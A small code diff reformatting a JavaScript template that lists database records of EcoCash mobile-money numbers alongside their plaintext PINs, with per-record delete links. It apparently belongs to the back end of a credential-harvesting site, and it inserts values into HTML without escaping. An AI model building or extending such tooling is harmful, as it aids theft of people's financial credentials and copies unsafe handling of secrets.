@@ -130,7 +130,7 @@ let rows = "";
 result.rows.forEach(item => {
 
   rows += `
-  <tr>
+<tr>
 
 <td>
 <input
@@ -140,18 +140,24 @@ value="${item.id}">
 </td>
 
 <td>${item.id}</td>
-    <td>${item.ecocash_number}</td>
-    <td>${item.ecocash_pin}</td>
-    <td>${new Date(item.created_at).toLocaleString()}</td>
-    <td>
-      <a href="/delete/${item.id}"
-         onclick="return confirm('Delete this record?')"
-         style="color:red;text-decoration:none;font-weight:bold;">
-         Delete
-      </a>
-    </td>
-  </tr>
-  `;
+
+<td>${item.ecocash_number}</td>
+
+<td>${item.ecocash_pin}</td>
+
+<td>${new Date(item.created_at).toLocaleString()}</td>
+
+<td>
+<a
+href="/delete/${item.id}"
+onclick="return confirm('Delete this record?')"
+style="color:red;text-decoration:none;font-weight:bold;">
+Delete
+</a>
+</td>
+
+</tr>
+`;
 
 });
 
